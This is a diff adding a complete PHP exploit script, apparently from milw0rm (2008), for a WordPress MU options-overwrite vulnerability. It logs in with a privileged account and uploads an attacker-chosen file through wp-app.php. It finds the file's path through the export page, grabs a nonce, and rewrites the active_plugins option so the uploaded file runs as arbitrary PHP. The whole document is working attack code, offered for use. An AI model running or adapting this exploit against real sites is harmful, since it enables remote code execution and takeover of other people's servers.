@@ -1,0 +1,98 @@
+<?php
+/*
+WordPress [MU] blog's options overwrite
+
+Credits : Alexander Concha <alex at buayacorp dot com>
+Website : http://www.buayacorp.com/
+Advisory: http://www.buayacorp.com/files/wordpress/wordpress-mu-options-overwrite.html
+
+This exploit uses active_plugins option to execute arbitrary PHP
+*/
+include_once './class-snoopy.php';
+
+// Fix Snoopy
+class SnoopyExt extends Snoopy {
+	function _prepare_post_body($formvars, $formfiles) {
+		if ( is_string($formvars) ) {
+			return $formvars;
+		}
+		return parent::_prepare_post_body($formvars, $formfiles);
+	}
+}
+
+set_time_limit( 0 );
+
+// Any user with 'manage_options' and 'upload_files' capabilities
+$user = 'user';
+$pass = '1234';
+$blog_url = 'http://localhost.localdomain/mu/';
+$remote_file = ''; // relative path to wp-content
+$local_file = ''; // the contents of this file, if any, will be uploaded
+
+$snoopy = new SnoopyExt();
+
+$snoopy->maxredirs = 0;
+$snoopy->cookies['wordpress_test_cookie'] = 'WP+Cookie+check';
+$snoopy->submit("{$blog_url}wp-login.php", array('log' => $user, 'pwd' => $pass));
+
+$snoopy->setcookies(); // Set auth cookies for future requests
+
+if ( empty($remote_file) ) {
+	// Upload a new file
+	$snoopy->_submit_type = 'image/gif';
+	$snoopy->submit("{$blog_url}wp-app.php?action=/attachments", get_contents());
+
+	if ( preg_match('#<id>([^<]+)</id>#i', $snoopy->results, $match) ) {
+		$remote_file = basename($match[1]);
+	}
+}
+if ( empty($remote_file) ) die('Exploit failed...');
+
+// Look for real path
+$snoopy->fetch("{$blog_url}wp-admin/export.php?download");
+
+if ( preg_match("#<wp:meta_value>(.*$remote_file)</wp:meta_value>#", $snoopy->results, $match) ) {
+	$remote_file = preg_replace('#.*?wp-content#', '', $match[1]);
+}
+if ( empty($remote_file) ) die('Exploit failed...');
+
+// It asumes that file uploads are stored within wp-content 
+$remote_file = '../' . ltrim($remote_file, '/');
+
+$snoopy->fetch("{$blog_url}wp-admin/plugins.php");
+
+// Recover previous active plugins
+$active_plugins = array();
+if ( preg_match_all('#action=deactivate&([^\']+)#', $snoopy->results, $matches) ) {
+	foreach ($matches[0] as $plugin) {
+		if ( preg_match('#plugin=([^&]+)#', $plugin, $match) )
+			$active_plugins[] = urldecode($match[1]);
+	}
+	print_r($active_plugins);
+}
+$active_plugins[] = $remote_file;
+
+// Fetch a valid nonce
+$snoopy->fetch("{$blog_url}wp-admin/options-general.php");
+
+if ( preg_match('#name=._wpnonce. value=.([a-z\d]{10}).#', $snoopy->results, $match) ) {
+
+	// Finally update active_plugins
+	$snoopy->set_submit_normal();
+	$snoopy->submit("{$blog_url}wp-admin/options.php",
+		array(
+			'active_plugins' => $active_plugins,
+			'_wpnonce' => $match[1],
+			'action' => 'update',
+			'page_options' => 'active_plugins',
+		));
+}
+
+function get_contents() {
+	global $local_file;
+
+	return file_exists($local_file) ? file_get_contents($local_file) : '<?php echo "Hello World " . __FILE__; ?>';
+}
+?>
+
+# milw0rm.com [2008-02-05]
